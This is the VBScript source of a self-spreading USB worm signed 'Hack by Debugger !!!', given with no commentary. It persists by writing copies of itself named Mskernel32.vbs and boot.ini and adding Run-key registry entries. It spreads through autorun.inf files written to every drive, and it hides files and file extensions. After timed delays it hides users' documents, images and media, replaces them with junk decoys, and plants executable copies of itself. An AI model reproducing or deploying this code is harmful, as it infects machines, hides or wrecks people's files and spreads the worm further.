'Debuger
Dim fso, fs, exp, dc, dx, dr, f1, winpath, rg, atr, source, wintmp, head, drv, msc, pic, msg, exc
Set fso = CreateObject("scripting.filesystemobject")
Set rg = CreateObject("wscript.shell")
Set winpath = fso.GetSpecialFolder(0)
Set fs = fso.OpenTextFile(wscript.scriptfullname)
    head = fs.ReadLine
    source = fs.ReadAll
Set drv = fso.Drives
    dc = drv.Count
msg = "Hack by Debugger !!!"
pic = "???? JFIF   d d  ?? Ducky     F  ?? Adobe d?   ?? ? "
msc = "ZQ!7????$f????(???…H2???o????-???%3[????o??_?k??|?.P?PyU 5g?w???+lr&??d??5.?MVlk????Xqk???l?Xg?l?|???"
atr = "[autorun]" & vbCrLf & "shellexecute=wscript.exe Mskernel32.vbs"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", "0"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL", winpath & "\Mskernel32.vbs"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32TMP", wintmp & "\Mskernel32.vbs"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\winboot", "wscript.exe " & winpath & "\boot.ini"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\boottmp", "wscript.exe " & wintmp & "\boot.ini"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun", 0, "REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden", 1, "REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", 0, "REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "1"
If head = "'Debug" Then
   rg.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
End If
Do
Remain
Set wintmp = fso.GetSpecialFolder(2)
If Not fso.FileExists(wintmp & "\" & "Mskernel32.vbs") Then
   Set fs = fso.CreateTextFile(wintmp & "\" & "Mskernel32.vbs")
       fs.Write ("'Debuger" & vbCrLf & source)
       fs.Close
End If
If Not fso.FileExists(wintmp & "\" & "boot.ini") Then
   Set fs = fso.CreateTextFile(wintmp & "\" & "boot.ini")
       fs.Write ("'Debuger" & vbCrLf & source)
       fs.Close
   Else
    Set fs = fso.GetFile(wintmp & "\" & "boot.ini")
        fs.Attributes = 32
    Set fs = fso.CreateTextFile(wintmp & "\" & "boot.ini")
        fs.Write ("'Debuger" & vbCrLf & source)
        fs.Close
    Set fs = fso.GetFile(wintmp & "\" & "boot.ini")
        fs.Attributes = 39
End If
Set winpath = fso.GetSpecialFolder(0)
If Not fso.FileExists(winpath & "\" & "Mskernel32.vbs") Then
   Set fs = fso.CreateTextFile(winpath & "\" & "Mskernel32.vbs")
       fs.Write ("'Debuger" & vbCrLf & source)
       fs.Close
End If
If Not fso.FileExists(winpath & "\" & "boot.ini") Then
   Set fs = fso.CreateTextFile(winpath & "\" & "boot.ini")
       fs.Write ("'Debuger" & vbCrLf & source)
       fs.Close
   Else
    Set fs = fso.GetFile(winpath & "\" & "boot.ini")
        fs.Attributes = 32
    Set fs = fso.CreateTextFile(winpath & "\" & "boot.ini")
        fs.Write ("'Debuger" & vbCrLf & source)
        fs.Close
    Set fs = fso.GetFile(winpath & "\" & "boot.ini")
        fs.Attributes = 39
    
End If
Set fs = fso.GetFile(wintmp & "\" & "Mskernel32.vbs")
    fs.Attributes = 39
Set fs = fso.GetFile(wintmp & "\" & "boot.ini")
    fs.Attributes = 39
Set fs = fso.GetFile(winpath & "\" & "Mskernel32.vbs")
    fs.Attributes = 39
Set fs = fso.GetFile(winpath & "\" & "boot.ini")
    fs.Attributes = 39
    For Each dr In fso.Drives
       If dx = dc Then
          dx = 0
       End If
       If dr.Path <> "A:" Then
             If Not fso.FileExists(dr.Path & "\" & "Mskernel32.vbs") Then
                Set fs = fso.CreateTextFile(dr.Path & "\" & "Mskernel32.vbs")
                    fs.Write ("'Debug" & vbCrLf & source)
                    fs.Close
             End If
             If Not fso.FileExists(dr.Path & "\" & "autorun.inf") Then
                Set fs = fso.CreateTextFile(dr.Path & "\" & "autorun.inf")
                    fs.Write (atr)
                    fs.Close
             Else
                Set fs = fso.GetFile(dr.Path & "\" & "autorun.inf")
                    fs.Attributes = 32
                Set fs = fso.CreateTextFile(dr.Path & "\" & "autorun.inf")
                    fs.Write (atr)
                    fs.Close
             End If
             Set fs = fso.GetFile(dr.Path & "\" & "Mskernel32.vbs")
                 fs.Attributes = 39
             Set fs = fso.GetFile(dr.Path & "\" & "autorun.inf")
                 fs.Attributes = 39
                rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", "0"
                rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL", winpath & "\Mskernel32.vbs"
                rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32TMP", wintmp & "\Mskernel32.vbs"
                rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\winboot", "wscript.exe /E:vbs " & winpath & "\boot.ini"
                rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\boottmp", "wscript.exe /E:vbs " & wintmp & "\boot.ini"
                rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun", 0, "REG_DWORD"
                rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden", 1, "REG_DWORD"
                rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", 0, "REG_DWORD"
                rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1"
                rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "1"
             If exp = Empty Then
                Remain
             End If
             If exp = "exp" Then
                FolderList (dr.Path)
             End If
       End If
       dx = dx + 1
    Next
    If dx = dc And exp <> 0 Then
       wscript.sleep 10000
    End If
Loop Until dx > dc
Sub FolderList(FolderSpec)
On Error Resume Next
Dim f, sf, path_list
Set f = fso.GetFolder(FolderSpec)
Set sf = f.SubFolders
    path_list = f.Path
    FileList (path_list)
    For Each f1 In sf
        path_list = f1.Path
        FileList (path_list)
        FolderList (path_list)
    Next
End Sub
Sub FileList(FolderSpec)
On Error Resume Next
Dim f2, f3, ext, bs, nf, bsn
Set f = fso.GetFolder(FolderSpec)
Set f2 = f.Files
    For Each f3 In f2
        ext = fso.GetExtensionName(f3.Path)
        bsn = fso.GetBaseName(f3.Path)
        bs = Right(bsn, 1)
        ext = LCase(ext)
        If ext = "xls" Or ext = "doc" Or ext = "ppt" Or ext = "pdf" Then
           If bs <> " " Then
              f3.Attributes = 39
              Set nf = fso.CreateTextFile(f.Path & "\" & bsn & " " & "." & ext)
                  nf.Write (msg)
                  nf.Close
              Set nf = fso.CreateTextFile(f.Path & "\" & bsn & ".exe")
                  nf.Write (source)
              Set nf = fso.GetFile(f.Path & "\" & bsn & ".exe")
                  nf.Attributes = 35
           End If
        End If
        If exc = "true" Then
           If ext = "jpg" Or ext = "bmp" Or ext = "ico" Or ext = "gif" Or ext = "emf" Then
              If bs <> " " Then
                 f3.Attributes = 39
                 Set nf = fso.CreateTextFile(f.Path & "\" & bsn & " " & "." & ext)
                     nf.Write (pic)
                     nf.Close
                 Set nf = fso.CreateTextFile(f.Path & "\" & bsn & ".exe")
                     nf.Write (source)
                     nf.Close
                 Set nf = fso.GetFile(f.Path & "\" & bsn & ".exe")
                     nf.Attributes = 35
              End If
           End If
           If ext = "mp3" Or ext = "wav" Or ext = "mp4" Or ext = "3gp" Or ext = "avi" Or ext = "dat" Or ext = "wmv" Then
              If bs <> " " Then
                 f3.Attributes = 39
                 Set nf = fso.CreateTextFile(f.Path & "\" & bsn & " " & "." & ext)
                     nf.Write (msc)
                     nf.Close
                 Set nf = fso.CreateTextFile(f.Path & "\" & bsn & ".exe")
                     nf.Write (source)
                     nf.Close
                 Set nf = fso.GetFile(f.Path & "\" & bsn & ".exe")
                     nf.Attributes = 35
              End If
           End If
        End If
    Next
End Sub
Sub Remain()
On Error Resume Next
Dim tm, rm, last, d, dd
Set fso = CreateObject("scripting.filesystemobject")
Set wintmp = fso.GetSpecialFolder(2)
    tm = Date
    d = CDbl(Date)
If Not fso.FileExists(wintmp & "\" & "SystemTime.log") Then
   Set rm = fso.CreateTextFile(wintmp & "\" & "SystemTime.log")
       rm.Write (d)
       rm.Close
   Set rm = fso.GetFile(wintmp & "\" & "SystemTime.log")
       rm.Attributes = 39
Else
   Set rm = fso.OpenTextFile(wintmp & "\" & "SystemTime.log")
       last = rm.ReadAll
       dd = CDbl(last)
       rm.Close
End If
If dd = Empty Then
   Remain
End If
If dd <> Empty Then
  If dd > 0 Then
    If dd + 30 < d Then
       exp = "exp"
    Else
       exp = "con"
    End If
    If dd + 60 < d Then
       exc = "true"
    Else
       exc = "false"
    End If
  End If
End If
End Sub